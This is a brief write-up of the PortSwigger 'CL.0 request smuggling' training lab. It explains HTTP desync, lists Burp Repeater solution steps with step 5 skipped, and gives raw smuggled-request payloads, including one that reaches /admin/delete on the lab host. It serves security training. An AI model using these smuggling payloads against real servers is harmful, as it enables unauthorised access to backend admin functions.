# Lab: CL.0 request smuggling

**Official lab:** [https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)

## Lab idea

This lab demonstrates CL.0 behavior: a backend ignores Content-Length for some endpoints. It practices assessing endpoint-specific request-boundary inconsistencies and their potential to expose backend-only functionality.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. From the Proxy > HTTP history , send the GET / request to Burp Repeater twice.
2. In Burp Repeater, add both of these tabs to a new group.
3. Go to the first request and convert it to a POST request (right-click and select Change request method ).
4. In the body, add an arbitrary request smuggling prefix.
- …
6. In Burp Repeater, change the path of your smuggled prefix to point to /admin .
7. Send the requests in sequence again and observe that the second request has successfully accessed the admin panel.
8. Smuggle a request to GET /admin/delete?username=carlos request to solve the lab.

## Payloads / key values
- `GET /`
- `POST`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x`
- `Connection`
- `keep-alive`
- `Content-Length`
- `/resources`
- `/resources/images/blog.svg`
- `/admin`
- `GET /admin/delete?username=carlos`
- `POST /resources/images/blog.svg HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Length: CORRECT GET /admin/delete?username=carlos HTTP/1.1 Foo: x`

## Official source
- [PortSwigger Academy: Lab: CL.0 request smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)
